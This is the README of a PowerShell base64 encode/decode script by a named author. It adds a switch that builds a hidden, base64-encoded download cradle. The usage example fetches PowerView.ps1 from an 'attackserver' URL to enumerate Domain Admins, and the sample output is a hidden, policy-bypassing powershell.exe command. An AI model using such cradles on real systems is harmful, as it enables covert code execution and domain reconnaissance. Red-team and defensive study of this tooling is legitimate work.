# Coded by Jesse Nebling (@bashexplode)

#### Description:
Quick and dirty base64 encoding and decoding with PowerShell. Also added a -SimpleExec switch to make an easy base64 encoded PowerShell cradle.

#### Usage:
    .\Base64.ps1 -Encode <string to encode>


    .\Base64.ps1 -Decode <base64 string to decode>


    .\Base64.ps1 -SimpleExec -Command "Get-DomainGroupMember 'Domain Admins' -Domain CONTOSO" -URL https://attackserver/PowerView.ps1  
Example Output:  
    
    powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -enc <base64 encoded output>
